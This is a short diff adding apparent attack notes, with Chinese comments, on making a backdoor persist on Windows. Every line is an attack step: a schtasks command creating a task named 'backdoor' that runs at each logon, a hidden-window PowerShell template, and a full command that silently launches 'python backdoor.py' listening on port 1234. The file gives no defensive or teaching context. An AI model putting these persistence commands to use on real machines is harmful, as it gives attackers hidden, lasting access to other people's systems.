@@ -1,0 +1,7 @@
+# 利用schtasks 创建计划任务
+schtasks /create /tn "backdoor" /tr "______" /sc onlogon
+
+# powershell 隐藏执行的终端
+powershell -windowstyle hidden -command '______'
+
+schtasks /create /tn "backdoor" /tr "powershell -windowstyle hidden -command 'D:\user\...\python backdoor.py -lp 1234'" /sc onlogon
